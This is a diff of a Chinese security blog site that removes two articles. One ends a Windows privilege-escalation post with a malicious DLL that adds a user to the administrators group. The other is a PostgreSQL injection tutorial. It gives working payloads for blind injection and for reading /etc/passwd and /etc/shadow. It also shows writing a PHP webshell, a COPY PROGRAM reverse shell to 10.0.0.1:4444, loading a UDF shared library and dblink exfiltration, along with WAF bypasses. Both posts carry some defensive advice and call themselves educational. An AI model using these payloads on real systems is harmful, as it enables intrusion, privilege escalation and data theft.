class="operator">-and</span> (<span class="built_in">Test-Path</span> <span class="variable">$_</span>)&#125; | <span class="built_in">ForEach-Object</span> &#123; <span class="built_in">Split-Path</span> <span class="variable">$_</span> <span class="literal">-Parent</span> &#125; | <span class="built_in">Select-Object</span> <span class="literal">-Unique</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$d</span> <span class="keyword">in</span> <span class="variable">$paths</span>) &#123;</span><br><span class="line">    <span class="variable">$acl</span> = <span class="built_in">Get-Acl</span> <span class="variable">$d</span></span><br><span class="line">    <span class="variable">$canWrite</span> = <span class="variable">$acl</span>.Access | <span class="built_in">Where-Object</span> &#123;</span><br><span class="line">        (<span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&quot;Users|Everyone&quot;</span>) <span class="operator">-and</span> (<span class="variable">$_</span>.FileSystemRights <span class="operator">-match</span> <span class="string">&quot;Write|FullControl&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$canWrite</span>) &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;[!] DLL劫持机会: <span class="variable">$d</span>&quot;</span> <span class="literal">-ForegroundColor</span> Red</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$dll</span> <span class="keyword">in</span> <span class="variable">$commonDlls</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="operator">-not</span> (<span class="built_in">Test-Path</span> <span class="string">&quot;<span class="variable">$d</span>\<span class="variable">$dll</span>&quot;</span>)) &#123; <span class="built_in">Write-Host</span> <span class="string">&quot;  缺失: <span class="variable">$d</span>\<span class="variable">$dll</span>&quot;</span> <span class="literal">-ForegroundColor</span> Yellow &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-4-恶意DLL制作"><a href="#7-4-恶意DLL制作" class="headerlink" title="7.4 恶意DLL制作"></a>7.4 恶意DLL制作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil.c - 编译: x86_64-w64-mingw32-gcc -shared -o version.dll evil.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE h, DWORD r, LPVOID l)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (r == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        system(<span class="string">&quot;cmd /c net localgroup administrators lowuser /add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>将编译好的DLL放置到可写的计划任务目录中即可：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> <span class="string">&quot;C:\temp\version.dll&quot;</span> <span class="string">&quot;C:\Program Files\Vendor\App\version.dll&quot;</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="八、综合防御建议"><a href="#八、综合防御建议" class="headerlink" title="八、综合防御建议"></a>八、综合防御建议</h2><ol>
-<li><strong>定期审计计划任务</strong>：用PowerShell脚本检查异常TaskName和Action。</li>
-<li><strong>限制启动文件夹权限</strong>：确保只有受信用户可写入。</li>
-<li><strong>监控注册表Run键</strong>：使用Sysmon监控<code>Microsoft\Windows\CurrentVersion\Run*</code>的修改。</li>
-<li><strong>审查WMI订阅</strong>：定期检查<code>root\subscription</code>命名空间。</li>
-<li><strong>禁用AlwaysInstallElevated</strong>：确保两处注册表值不为<code>0x1</code>。</li>
-<li><strong>最小权限原则</strong>：计划任务执行目录和脚本目录不应被低权限用户写入。</li>
-<li><strong>启用代码签名与SafeDllSearchMode</strong>：防止未签名DLL被加载。</li>
-</ol>
-<hr>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page">Microsoft Docs - Task Scheduler</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1053/">MITRE ATT&amp;CK - Scheduled Task (T1053)</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1547/">MITRE ATT&amp;CK - Boot or Logon Autostart Execution (T1547)</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1546/">MITRE ATT&amp;CK - Event Triggered Execution (T1546)</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1574/001/">MITRE ATT&amp;CK - DLL Search Order Hijacking (T1574.001)</a></li>
-<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">HackTricks - Windows Privilege Escalation</a></li>
-</ul>
-<hr>
-<blockquote>
-<p><strong>再次声明</strong>：本文仅供教育与授权的渗透测试用途。请在获得明确书面授权的前提下进行安全测试。</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
 
     
 
@@ -421,7 +220,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -443,428 +242,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>PostgreSQL 功能丰富、扩展性强，但高级特性同样扩大了注入攻击面。与 MySQL 不同，PostgreSQL 的利用链路从延时注入到文件系统操作再到命令执行，攻击向量更加多样。本文聚焦 PostgreSQL 特有的注入技术与实战利用手法。</p>
-<h2 id="与-MySQL-关键差异"><a href="#与-MySQL-关键差异" class="headerlink" title="与 MySQL 关键差异"></a>与 MySQL 关键差异</h2><table>
-<thead>
-<tr>
-<th>特性</th>
-<th>MySQL</th>
-<th>PostgreSQL</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>堆叠查询</td>
-<td>部分支持</td>
-<td>原生支持</td>
-</tr>
-<tr>
-<td>文件读取</td>
-<td>LOAD_FILE()</td>
-<td>pg_read_file()</td>
-</tr>
-<tr>
-<td>延时函数</td>
-<td>SLEEP()</td>
-<td>pg_sleep()</td>
-</tr>
-<tr>
-<td>命令执行</td>
-<td>UDF (.so&#x2F;.dll)</td>
-<td>UDF + COPY PROGRAM + PL&#x2F;pgSQL</td>
-</tr>
-<tr>
-<td>大对象</td>
-<td>无</td>
-<td>lo_import &#x2F; lo_export</td>
-</tr>
-</tbody></table>
-<h2 id="一、时间盲注：pg-sleep-系列"><a href="#一、时间盲注：pg-sleep-系列" class="headerlink" title="一、时间盲注：pg_sleep 系列"></a>一、时间盲注：pg_sleep 系列</h2><p>PostgreSQL 使用 <code>pg_sleep(seconds)</code> 实现延时，另有 <code>pg_sleep_for()</code> 和 <code>pg_sleep_until()</code> 用于更精细控制。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 条件延时：判断当前数据库名首字是否为 &#x27;t&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="keyword">SELECT</span> current_database()) <span class="keyword">LIKE</span> <span class="string">&#x27;t%&#x27;</span></span><br><span class="line">    <span class="keyword">THEN</span> pg_sleep(<span class="number">3</span>) <span class="keyword">ELSE</span> pg_sleep(<span class="number">0</span>) <span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 二分法盲注：判断字符 ASCII 是否大于 109（字母 &#x27;m&#x27;）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> ASCII(<span class="built_in">SUBSTRING</span>(current_database(), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">109</span></span><br><span class="line">    <span class="keyword">THEN</span> pg_sleep(<span class="number">2</span>) <span class="keyword">ELSE</span> pg_sleep(<span class="number">0</span>) <span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>
-
-<h3 id="重要陷阱"><a href="#重要陷阱" class="headerlink" title="重要陷阱"></a>重要陷阱</h3><p><code>pg_sleep()</code> 对每行都执行一次。若查询返回多行，总延时 &#x3D; 行数 × sleep 秒数，极易导致误判。务必使用 <code>generate_series(1,1)</code> 或 <code>LIMIT 1</code> 限制：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (...) THEN pg_sleep(3)</span></span><br><span class="line"><span class="string">    ELSE NULL END FROM generate_series(1,1))--</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="二、文件操作：pg-read-file-与-pg-ls-dir"><a href="#二、文件操作：pg-read-file-与-pg-ls-dir" class="headerlink" title="二、文件操作：pg_read_file 与 pg_ls_dir"></a>二、文件操作：pg_read_file 与 pg_ls_dir</h2><p>超级用户或拥有对应函数 EXECUTE 权限的角色可直接操作文件系统。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 读取 /etc/passwd（指定偏移与长度）</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_read_file(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="number">0</span>, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 读取 postgresql.conf 配置文件</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_read_file(</span><br><span class="line">    (<span class="keyword">SELECT</span> setting <span class="keyword">FROM</span> pg_settings <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;data_directory&#x27;</span>)</span><br><span class="line">    <span class="operator">||</span> <span class="string">&#x27;/postgresql.conf&#x27;</span>, <span class="number">0</span>, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 报错注入读取（无直接回显时）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CAST</span>(pg_read_file(<span class="string">&#x27;/etc/passwd&#x27;</span>) <span class="keyword">AS</span> <span class="type">integer</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 列出数据目录</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_ls_dir((<span class="keyword">SELECT</span> setting <span class="keyword">FROM</span> pg_settings <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;data_directory&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-<h2 id="三、COPY-命令利用"><a href="#三、COPY-命令利用" class="headerlink" title="三、COPY 命令利用"></a>三、COPY 命令利用</h2><p><code>COPY</code> 是 PostgreSQL 最强大的数据导入导出机制，支持文件读、写、命令执行。</p>
-<h3 id="文件读取与写入"><a href="#文件读取与写入" class="headerlink" title="文件读取与写入"></a>文件读取与写入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- COPY FROM 读文件</span></span><br><span class="line"><span class="keyword">CREATE</span> TEMP <span class="keyword">TABLE</span> file_content (line text);</span><br><span class="line"><span class="keyword">COPY</span> file_content <span class="keyword">FROM</span> <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> file_content;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- COPY TO 写 Webshell</span></span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">TO</span> <span class="string">&#x27;/var/www/html/upload/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<h3 id="COPY-PROGRAM-——-命令执行（9-3-）"><a href="#COPY-PROGRAM-——-命令执行（9-3-）" class="headerlink" title="COPY PROGRAM —— 命令执行（9.3+）"></a>COPY PROGRAM —— 命令执行（9.3+）</h3><p>最直接的命令执行方式，需超级用户且 <code>pg_execute_server_program</code> 未禁用：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 执行命令并获取回显</span></span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>) <span class="keyword">TO</span> PROGRAM <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将命令结果读入表中</span></span><br><span class="line"><span class="keyword">CREATE</span> TEMP <span class="keyword">TABLE</span> cmd_output (output text);</span><br><span class="line"><span class="keyword">COPY</span> cmd_output <span class="keyword">FROM</span> PROGRAM <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> cmd_output;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 反弹 Shell</span></span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>) <span class="keyword">TO</span> PROGRAM</span><br><span class="line">    <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<h2 id="四、大对象（Large-Object）攻击"><a href="#四、大对象（Large-Object）攻击" class="headerlink" title="四、大对象（Large Object）攻击"></a>四、大对象（Large Object）攻击</h2><p>大对象支持单一事务操作最大 4TB 数据，<code>lo_import()</code> 和 <code>lo_export()</code> 实现文件系统与数据库的双向传输。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- lo_import 将文件导入数据库，返回 OID</span></span><br><span class="line"><span class="keyword">SELECT</span> lo_import(<span class="string">&#x27;/etc/passwd&#x27;</span>);   <span class="comment">-- 返回如 123456</span></span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL, lo_import(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;), NULL--  -- 联合注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- lo_export 将大对象导出写文件</span></span><br><span class="line"><span class="string">SELECT lo_from_bytea(0, decode(&#x27;</span>cGxhaW50ZXh0<span class="string">&#x27;, &#x27;</span>base64<span class="string">&#x27;));</span></span><br><span class="line"><span class="string">SELECT lo_export(12345, &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 文件拷贝：读入后写出到可访问目录</span></span><br><span class="line"><span class="string">SELECT lo_export(lo_import(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;), &#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span>passwd_copy.txt<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 读取大对象内容（分片存储，按 pageno 排序拼接）</span></span><br><span class="line"><span class="string">SELECT encode(data, &#x27;</span><span class="keyword">escape</span><span class="string">&#x27;) FROM pg_largeobject</span></span><br><span class="line"><span class="string">    WHERE loid=12345 ORDER BY pageno;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="五、UDF-命令执行"><a href="#五、UDF-命令执行" class="headerlink" title="五、UDF 命令执行"></a>五、UDF 命令执行</h2><p>当 COPY PROGRAM 不可用时，编译共享库创建用户自定义函数是经典提权路径。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Step 1: 以十六进制将 .so 文件分片写入大对象</span></span><br><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">99999</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">99999</span>, <span class="number">0</span>, decode(<span class="string">&#x27;7f454c46...&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Step 2: 导出到文件系统</span></span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">99999</span>, <span class="string">&#x27;/tmp/evil.so&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Step 3: 创建函数并执行命令</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> sys_eval(text) <span class="keyword">RETURNS</span> text</span><br><span class="line">    <span class="keyword">AS</span> <span class="string">&#x27;/tmp/evil.so&#x27;</span>, <span class="string">&#x27;sys_eval&#x27;</span> <span class="keyword">LANGUAGE</span> C STRICT;</span><br><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;cat /etc/shadow&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<h3 id="C-语言-UDF-模板（核心骨架）"><a href="#C-语言-UDF-模板（核心骨架）" class="headerlink" title="C 语言 UDF 模板（核心骨架）"></a>C 语言 UDF 模板（核心骨架）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;postgres.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fmgr.h&quot;</span></span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line">PG_FUNCTION_INFO_V1(sys_eval);</span><br><span class="line">Datum <span class="title function_">sys_eval</span><span class="params">(PG_FUNCTION_ARGS)</span> &#123;</span><br><span class="line">    FILE *fp = popen(text_to_cstring(PG_GETARG_TEXT_P(<span class="number">0</span>)), <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">// ... 读取输出，组装 text 返回</span></span><br><span class="line">    PG_RETURN_TEXT_P(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="六、PL-pgSQL-代码执行"><a href="#六、PL-pgSQL-代码执行" class="headerlink" title="六、PL&#x2F;pgSQL 代码执行"></a>六、PL&#x2F;pgSQL 代码执行</h2><p>PL&#x2F;pgSQL 是 PostgreSQL 原生过程语言。在可堆叠查询场景下，使用 <code>DO</code> 匿名块可实现复杂逻辑并绕过部分 WAF。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- DO 块直接调用 COPY PROGRAM</span></span><br><span class="line">DO $$</span><br><span class="line"><span class="keyword">DECLARE</span> cmd text :<span class="operator">=</span> <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">EXECUTE</span> <span class="string">&#x27;COPY (SELECT &#x27;&#x27;&#x27;&#x27;) TO PROGRAM &#x27;&#x27;&#x27;</span> <span class="operator">||</span> cmd <span class="operator">||</span> <span class="string">&#x27;&#x27;&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 循环盲注：逐字符提取并在 NOTICE 中回显</span></span><br><span class="line">DO $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    i <span class="type">integer</span>; c text; <span class="keyword">result</span> text :<span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">FOR</span> i <span class="keyword">IN</span> <span class="number">1.</span><span class="number">.30</span> LOOP</span><br><span class="line">        <span class="keyword">SELECT</span> chr(ASCII(<span class="built_in">SUBSTRING</span>(current_database(), i, <span class="number">1</span>))) <span class="keyword">INTO</span> c;</span><br><span class="line">        IF c <span class="keyword">IS</span> <span class="keyword">NOT NULL</span> <span class="keyword">THEN</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="keyword">result</span> <span class="operator">||</span> c; <span class="keyword">END</span> IF;</span><br><span class="line">    <span class="keyword">END</span> LOOP;</span><br><span class="line">    RAISE NOTICE <span class="string">&#x27;Extracted: %&#x27;</span>, <span class="keyword">result</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- dblink 带外数据外传（需扩展已安装）</span></span><br><span class="line"><span class="keyword">CREATE</span> EXTENSION IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> dblink;</span><br><span class="line"><span class="keyword">SELECT</span> dblink_connect(</span><br><span class="line">    <span class="string">&#x27;host=10.0.0.1 port=53 user=exfil password=&#x27;</span> <span class="operator">||</span></span><br><span class="line">    (<span class="keyword">SELECT</span> current_database()) <span class="operator">||</span> <span class="string">&#x27; dbname=test&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<h2 id="七、攻击决策流程图"><a href="#七、攻击决策流程图" class="headerlink" title="七、攻击决策流程图"></a>七、攻击决策流程图</h2><pre class="mermaid">flowchart TD
-    A[发现 SQL 注入点] --> B{堆叠查询?}
-    B -->|是| C{当前角色权限?}
-    B -->|否| D{有回显?}
-    D -->|有| E[联合查询 / 报错注入]
-    D -->|无| F[pg_sleep 时间盲注]
-    C -->|超级用户| G{攻击目标?}
-    C -->|普通用户| H[查询敏感数据]
-    G -->|读文件| I[pg_read_file / COPY FROM]
-    G -->|写文件| J[COPY TO / lo_export]
-    G -->|命令执行| K[COPY PROGRAM]
-    K --> L{成功?}
-    L -->|否| M[UDF 提权: 写入.so]
-    M --> N[CREATE FUNCTION 注册]
-    N --> O[sys_eval 命令执行]
-    L -->|是| P[获取 SHELL]
-    J --> P</pre>
-
-<h2 id="八、WAF-绕过与实战陷阱"><a href="#八、WAF-绕过与实战陷阱" class="headerlink" title="八、WAF 绕过与实战陷阱"></a>八、WAF 绕过与实战陷阱</h2><h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 注释符隔断关键字</span></span><br><span class="line"><span class="keyword">SELECT</span> PG_SLEEP<span class="comment">/**/</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- CHR() 字符构造绕过关键字</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_read_file(CHR(<span class="number">47</span>)<span class="operator">||</span>CHR(<span class="number">101</span>)<span class="operator">||</span>CHR(<span class="number">116</span>)<span class="operator">||</span>CHR(<span class="number">99</span>)<span class="operator">||</span></span><br><span class="line">    CHR(<span class="number">47</span>)<span class="operator">||</span>CHR(<span class="number">112</span>)<span class="operator">||</span>CHR(<span class="number">97</span>)<span class="operator">||</span>CHR(<span class="number">115</span>)<span class="operator">||</span>CHR(<span class="number">115</span>)<span class="operator">||</span>CHR(<span class="number">119</span>)<span class="operator">||</span>CHR(<span class="number">100</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 美元引号绕过单引号过滤</span></span><br><span class="line"><span class="keyword">SELECT</span> $tag$<span class="operator">&lt;</span>?php <span class="keyword">system</span>($_GET[&quot;c&quot;]);?<span class="operator">&gt;</span>$tag$;</span><br></pre></td></tr></table></figure>
-
-<h3 id="常见陷阱"><a href="#常见陷阱" class="headerlink" title="常见陷阱"></a>常见陷阱</h3><ol>
-<li><strong>权限不足</strong>：<code>pg_read_file</code> 和 <code>COPY PROGRAM</code> 默认仅超级用户可用，云数据库（RDS、Cloud SQL）通常直接禁用。</li>
-<li><strong>WAL 日志</strong>：大对象和 COPY 操作全量记入 WAL，留下清晰的取证痕迹。</li>
-<li><strong>二进制读取</strong>：PG 14 之前需使用 <code>pg_read_binary_file()</code> 读取二进制文件，<code>pg_read_file()</code> 受编码影响可能截断。</li>
-<li><strong>OID 耗尽</strong>：32 位系统 OID 上限约 40 亿，密集 lo_import 可能耗尽 OID 池。</li>
-<li><strong>RDS 受限</strong>：AWS RDS 禁用文件系统函数和 COPY PROGRAM，攻击面收缩至 dblink 带外与数据窃取。</li>
-</ol>
-<h2 id="九、防御措施"><a href="#九、防御措施" class="headerlink" title="九、防御措施"></a>九、防御措施</h2><h3 id="开发层面"><a href="#开发层面" class="headerlink" title="开发层面"></a>开发层面</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 始终使用参数化查询</span></span><br><span class="line"><span class="keyword">PREPARE</span> safe_query (text) <span class="keyword">AS</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> $<span class="number">1</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> safe_query(<span class="string">&#x27;user_input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 最小权限：为应用创建受限角色，切忌授予 SUPERUSER</span></span><br><span class="line"><span class="keyword">CREATE</span> ROLE app_user LOGIN PASSWORD <span class="string">&#x27;strong_password&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span>, <span class="keyword">DELETE</span></span><br><span class="line">    <span class="keyword">ON</span> <span class="keyword">ALL</span> TABLES <span class="keyword">IN</span> SCHEMA public <span class="keyword">TO</span> app_user;</span><br></pre></td></tr></table></figure>
-
